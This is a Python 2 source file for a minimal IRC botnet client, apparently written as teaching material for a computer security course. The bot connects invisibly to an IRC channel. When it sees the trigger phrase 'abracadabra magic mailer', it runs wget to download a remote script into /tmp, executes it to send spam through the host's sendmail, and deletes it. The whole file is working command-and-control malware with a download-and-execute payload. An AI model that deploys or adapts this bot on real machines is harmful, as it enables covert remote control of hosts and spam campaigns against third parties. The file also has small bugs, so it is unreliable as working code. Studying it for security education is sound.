#!/usr/bin/env python

##   miniBot.py
##   April 9, 2017

##   Python version of the silly little bot by Avi Kak  (kak@purdue.edu)
##
##   For this bot to make a connection with an IRC server,
##   someone has to execute, knowingly or unknowingly, the 
##   following command line:
##
##      miniBot.py  server_address  port  nick  channel
##

##   This is a mini bot because it has only one exploit programmed
##   into it: the bot sends out spam to a third-party mailing list.
##   However, for that work, the host "infected" by this bot must
##   have the sendmail MTA running.

##   The bot's exploit is triggered when it receives the following
##   string
##
##         abracadabra magic mailer
##
##   from the IRC channel it is connected to.  Note that the bot
##   logs into the IRC server via the USER command:
##
##        USER  login  8  *  :some text
##
##   as shown in line (23).  As stated in RFC 2812 for IRC, the second
##   argument to the USER command represents a bit mask that determines the
##   various properties of the user in the channel.  Using the number 8
##   would cause the user to become invisible to others in the same
##   channel.

import sys, socket, signal, os, re, glob                                                 #(1)

if len(sys.argv) != 5:                                                                   #(2)
    sys.exit(''' Usage:  Requires 4 arguments as in\n\n\n'''
             '''     miniBot.py  host  port  nick  channel  \n\n'''
             ''' Example: miniBot.py irc.freenode.net 6667 botrow \##PurdueCompsec\n\n''') 

def sock_close( signum, frame ):                                                         #(3)
    global sock                                                                          #(4)
    sock.close                                                                           #(5)
    sys.exit(0)                                                                          #(6)

signal.signal( signal.SIGINT, sock_close )                                               #(7)

server  = sys.argv[1]                                                                    #(8)
port    = int(sys.argv[2])                                                               #(9)
nick    = sys.argv[3]                                                                   #(10)
login   = nick                                                                          #(11)
channel = sys.argv[4]                                                                   #(12)

try:                                                                                    #(13)
    sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )                          #(14)
    sock.connect((server, port))                                                        #(15)
except socket.error, (value, message):                                                  #(16)
    if sock:                                                                            #(17)
        sock.close()                                                                    #(18)
    else:                                                                               #(19)
        print("Could not establish a client socket: " + message)                        #(20)
        sys.exit(1)                                                                     #(21)

sock.send("NICK " + nick + "\r\n")                                                      #(22)
sock.send("USER " + login + " 8 * :from the miniBot\r\n")                               #(23)

while True:                                                                             #(24)
    input = ''                                                                          #(25)
    while True:                                                                         #(26)
        byte = sock.recv(1)                                                             #(27)
        if byte == "\n": break                                                          #(28)
        input += byte                                                                   #(29)
    if '004' in input:               # connection established                           #(30)
        break                                                                           #(31)
    elif 'PING' in input:                                                               #(32)
        if ':' in input:                                                                #(33)
            digits = input[input.find(':') + 1 : ]                                      #(34)
            sock.send( 'PONG ' + digits + "\r\n")                                       #(35)
    elif '433' in input:                                                                #(36)
         sys.exit("Nickname is already in use.")                                        #(37)
sock.send('JOIN ' + channel + "\r\n")                                                   #(39)

while True:                                                                             #(40)
    input = ''                                                                          #(41)
    while True:                                                                         #(42)
        byte = sock.recv(1)                                                             #(43)
        if byte == "\n": break                                                          #(44)
        input += byte                                                                   #(45)
    regex = re.compile( r'^PING(.*)$', re.IGNORECASE )                                  #(46)
    m = re.search( regex, input )                                                       #(47)
    if m is not None:                                                                   #(48)
        sock.send("PONG " + m.group(1) + "\r\n")                                        #(49)
    else:                                                                               #(50)
        regex = r'(^[^!]*)![^ ]*'                                                       #(51)
        m = re.search( regex, input )                                                   #(52)
        if m is not None:                                                               #(53)
            input = re.sub(regex, m.group(1), input)                                    #(54)
        if "abracadabra magic mailer" in input:                                         #(55)
            current_dir = os.getcwd()
            print(current_dir)                                                   #(56)
            os.chdir("/tmp")                                                            #(57)
            os.system("wget http://engineering.purdue.edu/kak/emailer_py")              #(58)
            os.system("python emailer_py");                                             #(59)
            os.unlink( glob.glob("emailer*") )                                          #(60)
            os.chdir( current_dir )                                                     #(61)
